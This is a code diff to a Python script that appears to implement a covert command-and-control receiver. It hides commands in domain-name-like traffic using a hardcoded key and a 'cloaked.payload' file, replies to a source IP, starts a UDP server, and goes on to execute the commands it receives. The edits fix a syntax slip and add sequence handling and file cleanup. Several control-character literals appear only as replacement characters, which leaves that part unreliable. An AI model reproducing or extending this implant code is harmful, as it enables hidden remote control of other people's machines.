@@ -28,7 +28,7 @@ key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
 cipher = "ciphers\\common_fqdn\\topWebsites"
 dns = '127.0.0.1'
 
-def receive_command(local=False, args=None):
+def receive_command(local=False, args=None, seq_id=0):
     srcIp = os.environ.get('SRC_IP')
     cloakedFile = "cloaked.payload"
     
@@ -52,7 +52,7 @@ def receive_command(local=False, args=None):
     if os.environ.get('EOT') == 'True' or local:
         def timeout_handler():
             print("No command received within 3 seconds. Requesting re-transmission.")
-            send_response('�'.do, srcIp, args)
+            send_response('�', srcIp, args)
             receive_command(local, args)
         timer = threading.Timer(3.0, timeout_handler)
         timer.start()
@@ -60,6 +60,7 @@ def receive_command(local=False, args=None):
         with open(cloaked_command, 'r') as file:
             if file.read().strip() == "":
                 timer.cancel()
+                os.remove(cloaked_command) if os.path.exists(cloaked_command) else None
                 print("No command received.")
                 return
         
@@ -91,9 +92,8 @@ def receive_command(local=False, args=None):
         elif receive_command == '�':
             send_response(command, args=args)
         elif command.startswith('�') and command[1:].isdigit():
-            # appendi domini
-    
-
+            #receive_command(local, args, int(command[1:]))
+            start_udp_server(seq_id)
 
         # Execute the command
         try:
